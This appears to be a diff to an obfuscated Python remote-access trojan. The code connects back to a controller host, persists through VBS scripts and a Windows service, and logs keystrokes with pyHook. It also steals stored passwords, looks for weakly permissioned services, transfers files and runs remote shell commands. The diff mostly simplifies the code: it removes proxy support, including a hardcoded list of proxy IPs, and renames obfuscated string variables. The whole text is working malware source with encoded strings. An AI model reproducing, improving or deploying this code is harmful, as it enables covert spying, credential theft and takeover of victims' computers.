@@ -22,28 +22,14 @@ def fscreenshot():
 def fconnect():
 	global s, success, i1II1iI1IIIiiil1l
 	i1II1iI1IIIiiil1l = False
-	if useproxy:
-		while not i1II1iI1IIIiiil1l:
-			for proxy in proxies:
-				try:
-					s = socks.socksocket()
-					s.setproxy(socks.HTTP,proxy[0],proxy[1])
-					s.settimeout(20)
-					s.connect((host, port))
-					success = funrot('AhwmMgQbfCsnIAwgCDV9NQEaA3o1KWQn') + success
-					i1II1iI1IIIiiil1l = True
-					break
-				except:
-					pass
-	else:
-		while not i1II1iI1IIIiiil1l:
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.settimeout(20)
-				s.connect((host, int(port)))
-				i1II1iI1IIIiiil1l = True
-			except:
-				pass
+	while not i1II1iI1IIIiiil1l:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.settimeout(20)
+			s.connect((host, int(port)))
+			i1II1iI1IIIiiil1l = True
+		except:
+			pass
 	s.send(success)
 	s.settimeout(999)
 	pwd = os.getcwd()
@@ -65,11 +51,11 @@ def fpersist():
 	with open(vbsdst, 'w') as pv:
 		pv.write(vbscript)
 	fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + vbsdst)
-	l12cHnnds = funrot('Nx0mEC8bBQ') + sys.argv[0] + ' ' + agent + funrot('Fz0')
+	l12cHnnds = funrot('Nx0mEC8bBQ') + sys.argv[0] + ' ' + agent + fzo
 	l12cHnnds += funrot('DjQtHS4fEjUTGAwREA0') + servicename + funrot('HR1VSBQNCjkrRj1REA8POigeA0EVIyAVJjttRzwKNA4sLhMAKUNbDDMbQ094Lw') + vbsdst + funrot('HTMuFC8fCjUhJioBOCEAKhcdIkEsGTdVJj9hXy9/DSg')
-	l12cHnnds += funrot('NwImTwQZ') + tempvbs + funrot('Fz0')
-	l12cHnnds += funrot('DjQtHS4ADiESMj5aAH4hfxQdA1M') + servicename + ' ' + servicedisc + funrot('Fz0')
-	l12cHnnds += funrot('NwImTwQbfQMnJikBExRwNwAzD1M8JxYBDDsWXS9/cQ8VEAQ') + servicename + funrot('Fz0')
+	l12cHnnds += funrot('NwImTwQZ') + tempvbs + fzo
+	l12cHnnds += funrot('DjQtHS4ADiESMj5aAH4hfxQdA1M') + servicename + ' ' + servicedisc + fzo
+	l12cHnnds += funrot('NwImTwQbfQMnJikBExRwNwAzD1M8JxYBDDsWXS9/cQ8VEAQ') + servicename + fzo
 	hb = funrot('AR06Ay81IDUgGFFbOiIHIwYzDH8sIBYACxUaXjkmHlIsBykHORhTDAIhX154LSs+JycnFgguFDk9WiQiASkHGQ85fzUOA1F9KSI3Www7Fi8IPC49OQYaPgsDI0YuIgw2AHI4IScwLBMzVQ')
 	with open(tempvbs, 'w') as hid:
 		hid.write(hb)
@@ -86,7 +72,7 @@ def fpersist():
 def funpersist():
 	with open(datafile, 'rb') as f:
 		settings = DecodeAES(cipher, f.read().strip(''))
-		settings = settings[30:].split(funrot('Fz0'))
+		settings = settings[30:].split(fzo)
 	agentn = settings[0]
 	vbsdstn = settings[1]
 	fsubprocess(funrot('DjQtHS4ADnkSGAwREA0') + servicename)
@@ -142,35 +128,10 @@ def fkeypress(l12cHnns):
 	global keydump
 	if l12cHnns.Ascii:
 		char = chr(l12cHnns.Ascii) 
-		if l12cHnns.Ascii == 13:   
-			keydump += funrot('Fz0')
-		elif l12cHnns.Ascii == 8:
-			keydump += funrot('A2pVDy4QLCEoR10fOiB1')
-		elif l12cHnns.Ascii == 9:
-			keydump += funrot('A2oIDy9pdA')
-		elif l12cHnns.Ascii == 16:
-			keydump += funrot('A2o2Syk2CiIpJA')
-		elif l12cHnns.Ascii == 17:
-			keydump += funrot('A2suExQPICAoGwQM')
-		elif l12cHnns.Ascii == 27:
-			keydump += funrot('A2smFy4fcSYSGVg')
-		elif l12cHnns.Ascii == 35:
-			keydump += funrot('A2smEi4OdA')
-		elif l12cHnns.Ascii == 36:
-			keydump += funrot('A2s6Eyg2Dig')
-		elif l12cHnns.Ascii == 37:
-			 keydump += funrot('A2sAAy5qICg')
-		elif l12cHnns.Ascii == 38:
-			keydump += funrot('A2oEPhUJ')
-		elif l12cHnns.Ascii == 39:
-			keydump += funrot('A2o6SCkQEiIpJA')
-		elif l12cHnns.Ascii == 40:
-			keydump += funrot('A2sqEyw1Aig')
-		else:
-			if char in string.printable:
-				keydump += char
-def fxor(s1):
-	return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,xorkey))
+		if char in string.printable:
+			keydump += char.strip(fzo)
+def fxor(l12oHn4d):
+	return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(l12oHn4d,xorkey))
 def fkeylog():
 	proc = pyHook.HookManager()    
 	proc.KeyDown = fkeypress
@@ -213,20 +174,19 @@ def fremoteprint(l12cHon5):
 ***64EXE***
 ***86EXE***
 r1, r2, r3 = fdonotmuch('99kUmc4546c4FQsIMsd', '4bImA7Gysgs3'), fdonotmuch('1fSHoAOqML4D6', '4ILAksPhdhdfn'), fdonotmuch('g7bPlR/32Xs3w', 'E/LmszKXw4AwcBXDUKKyInAS0')
-r4, r5, r6, r7, xorkey = 34 ** 23, bypass86exe[10400:10950], (14 / 2) * 6, bypass64exe[5:6755], ***XOR***
-host, port, secret = ***HOST***, ***PORT***, ***SECRET***
+is64, isWindows, MeterBin, ushell = False, False, False, None
+isAdmin, r4, r5, r6, isSystem, r7, xorkey, DropSock, r8, r9, r10 = False, 34 ** 23, bypass86exe[10400:10950], (14 / 2) * 6, False, bypass64exe[5:6755], ***XOR***, None,  True, None, 244
 BLOCK_SIZE, PADDING, keydump = 32, '{', ''
+hzo, fzo, host, port, secret, eas = funrot('Hz0'), funrot('Fz0'), ***HOST***, ***PORT***, ***SECRET***, funrot('EAs')
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: ***B64E***(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(***B64D***(e))
 iv = Random.new().read(***AES***.block_size)
 cipher = ***AES***.new(secret,***AES***.MODE_CFB, iv)
-MeterBin, DropSock = None, None
-isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
-pwd = os.getcwd()
+ees, pwd = funrot('ATYmKRg0Dh8kGSI7DCAPHhgcDGcjIh4/OhQeYyAhDjAaBQ9hJR1yKgUafWVkAigEOyIkIhcrHCE6WCwdMCgDJBY+AAo/KHMYHyM7ZgM+OwsWAyUDJSI'), os.getcwd()
 opsys = platform.uname()[0] + ' ' + platform.uname()[2]
-paddedopsys = opsys + funrot('Hz0') * (64 - len(opsys))
-starpadding = funrot('Hz0') * 16
+paddedopsys = opsys + hzo * (64 - len(opsys))
+starpadding = hzo * 16
 sepvar, eofv = os.sep, funrot('ATEmPhoJ')
 if platform.machine()[-2:] == funrot('GjA9'):
 	is64 = True
@@ -244,10 +204,10 @@ if os.name == funrot('DQ0P'):
 	datafile = ***ENV***(windirvar) + funrot('DB8IAyg1Ci8QGzIAAxtwJS4jc0wUIzc')
 	pwdvar = funrot('NxIp')
 	isWindows = True
-	paddedpwd = pwd.strip(funrot('EAs')) + funrot('Hz0') * (64 - len(pwd.strip(funrot('EAs'))))
-	adm = fsubprocess(funrot('NTQ6Ey82NH4')).strip(funrot('Fz0')).strip(funrot('EAs'))
-	stdout = fsubprocess(funrot('DQImFAQQKCUSMl1dPQsTJCw3C1MUIBJaCxUSAi8gIA8tBCFbKiZhHjY1dUxVAyQvJw0nHRECDCE9YSABMigAGwo1')).strip(funrot('Fz0')).strip(funrot('EAs'))
-	persistinfo = EncodeAES(cipher, funrot('Hz0') * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))
+	paddedpwd = pwd.strip(eas) + hzo * (64 - len(pwd.strip(eas)))
+	adm = fsubprocess(funrot('NTQ6Ey82NH4')).strip(fzo).strip(eas)
+	stdout = fsubprocess(funrot('DQImFAQQKCUSMl1dPQsTJCw3C1MUIBJaCxUSAi8gIA8tBCFbKiZhHjY1dUxVAyQvJw0nHRECDCE9YSABMigAGwo1')).strip(fzo).strip(eas)
+	persistinfo = EncodeAES(cipher, hzo * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))
 	if stdout != '':
 		isAdmin = True
 	if adm.lower() == funrot('DQ0PHS81LCIVIiIEPSEhPhU3HEcsIzAVCh8'):
@@ -260,50 +220,40 @@ if os.name == funrot('DQ0P'):
 ***PERSIST***
 	if is64:
 		if isSystem:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHMiDw'), paddedpwd, starpadding))
 		else:
 			if isAdmin:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAY%s%s' % (paddedopsys, paddedpwd, starpadding))
+				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHsiDw'), paddedpwd, starpadding))
 			else:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFY%s%s' % (paddedopsys, paddedpwd, starpadding))
+				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAiDw'), paddedpwd, starpadding))
 	else:
 		if isSystem:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSH%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHMgHw'), paddedpwd, starpadding))
 		else:
 			if isAdmin:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s%s' % (paddedopsys, paddedpwd, starpadding))
+				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHsgHw'), paddedpwd, starpadding))
 			else:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s%s' % (paddedopsys, paddedpwd, starpadding))
+				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAgHw'), paddedpwd, starpadding))
 elif os.name == funrot('DWgmFyk1Nw'):
 	if os.getuid() == 0:
 		isSystem = True
 	pwdvar = funrot('DWgcAg')
 	ushell = ***ENV***(funrot('BjY6KRoOLw'))
-	paddedpwd = pwd + funrot('Hz0') * (64 - len(pwd))
+	paddedpwd = pwd + hzo * (64 - len(pwd))
 	if isSystem:
 		if is64:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbHG4iDw'), paddedpwd, starpadding))
 		else:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbHG4gHw'), paddedpwd, starpadding))
 	else:
 		if is64:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDG4iDw'), paddedpwd, starpadding))
 		else:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s%s' % (paddedopsys, paddedpwd, starpadding))
+			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDG4gHw'), paddedpwd, starpadding))
 else:
 	pwdvar = funrot('DWgcAg')
-	paddedpwd = pwd + funrot('Hz0') * (64 - len(pwd))
-	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))
-try:
-	proxies = []
-	with open(proxyfile) as pl:
-		decpl = DecodeAES(cipher, pl.read())
-	for line in decpl.split(funrot("Fz0")):
-		proxies.append([line.split(funrot('Gz0'))[0], int(line.split(funrot('Gz0'))[1])])
-except:
-	proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
-			  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]]
-***PROXY***
+	paddedpwd = pwd + hzo * (64 - len(pwd))
+	success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDH0gHw'), paddedpwd, starpadding))
 fconnect()
 while True:
 	try:
@@ -370,7 +320,7 @@ while True:
 							sendpass += funrot('HRwfCxULBgcSGFEFPSEhNAEnDFgSIAZeNiw7Vw') + information[0]
 							sendpass += funrot('FzMuGAY0dCsiGyIeAyIfIy4Zd0EVCTBeNhURBjwM') + information[1]
 							sendpass += funrot('FzMuGAY0dCsiMjIRAxsDOCgeDwI/Dw') + information[2]
-							sendpass += funrot('FzMuGAY0dCsgR10FAyE1JBcoAwI/Dw') + passw + funrot('Fz0')
+							sendpass += funrot('FzMuGAY0dCsgR10FAyE1JBcoAwI/Dw') + passw + fzo
 					if sendpass:
 						sendit += funrot('FzMuGAY0dCsgR10FAyE1JBcoAFk/BhoFDj8SSDwFCgoVOgQ') + '%s:**n' % (passpath[1])
 						sendit += sendpass
@@ -409,15 +359,15 @@ while True:
 			else:
 				vulnpaths = ''
 				winservices = fsubprocess(funrot('N2gmFgQbfTY4NiIGACItNBQnHw07JxYUDBY4AhAgHVoFE3VcORh5FTIfdQRoPSM4JHweRyYpFxU1WiwiBBwTACA7CGwOKWMlAwc/WjMKHT0lJyFiKR0WMA5ZM1IuCwMwEwcgPCAJBhM5XgVuN0kfUAIWMzIrGjgCCjYxLSwbATdoWShheAggLxstBgIuEwJTH3w7DVMYOS9zPns'))
-				for line in winservices.split(funrot('Fz0')):
+				for line in winservices.split(fzo):
 					if line:
 						if line[0] == '"':
-							line = '"' + line.split('"')[1].strip(funrot('EAs')) + '"'
+							line = '"' + line.split('"')[1].strip(eas) + '"'
 						else:
-							line = '"' + line.split('/')[0].strip(funrot('EAs')) + '"'
+							line = '"' + line.split('/')[0].strip(eas) + '"'
 						out = fsubprocess(funrot('MDQuDy4QKCE4NA') + line)
 						if out.find(funrot('AGoELRoNIBsgIxAhAyIPIRcaKVsgJz8DOgE/')) != -1 or out.find(funrot('AGoELRoNIBsgIxAhAyIPIRcaKVsjNz8')) != -1:
-							vulnpaths += line + funrot('Fz0')
+							vulnpaths += line + fzo
 				if vulnpaths:
 					fremoteprint(funrot('HRwfCxULBgcVGC4QACE1IAQ3HE0sGTheDDAeXTwKNFEVWhBVER9yDDU1dU5VAzQuDQkKGBgQIRU2BywiACoTGhk8EDAzE2B9CSge') + vulnpaths)
 				else:
@@ -436,7 +386,7 @@ while True:
 		s.send(encrypted)
 	elif decrypted.startswith(funrot('Nw0mCxQAKCUTGy0P')):
 		if decrypted.split(' ')[1].find(sepvar) == -1:
-			downpath = pwd.strip(funrot('EAs')) + sepvar + decrypted.split(' ')[1]
+			downpath = pwd.strip(eas) + sepvar + decrypted.split(' ')[1]
 		else:
 			downpath = decrypted.split(' ')[1]
 		with open(downpath, 'rb') as f:
@@ -451,7 +401,7 @@ while True:
 			fremoteprint(funrot('HRwYNhULBh0oGABdOh8HJRQdJVMVGR4dNiA4WRcjAQQ') + url)
 	elif decrypted.startswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAkKQ")):
 		try:
-			ufilename = pwd.strip(funrot('EAs')) + sepvar + decrypted[32:48].strip(funrot('Hz0'))
+			ufilename = pwd.strip(eas) + sepvar + decrypted[32:48].strip(hzo)
 			decrypted = decrypted[48:]
 			with open(ufilename, 'wb') as f:
 				if decrypted.endswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAiHw")):
@@ -485,12 +435,12 @@ while True:
 			l12cHnnd = funrot('NxIpHQ') + '%s&&%s&&%s' % (pwd, decrypted, pwdvar)
 			stdout = fsubprocess(l12cHnnd)
 			try:
-				checkpath = stdout.split(funrot('Fz0'))[-2].strip(funrot('Fz0')).strip(funrot('EAs'))
+				checkpath = stdout.split(fzo)[-2].strip(fzo).strip(eas)
 				if os.path.exists(checkpath):
 					pwd = checkpath
 			except:
 				pass
-			result = funrot('Fz0').join(stdout.split(funrot('Fz0'))[:-1])
+			result = fzo.join(stdout.split(fzo)[:-1])
 			try:
 				fremoteprint(result)
 			except:
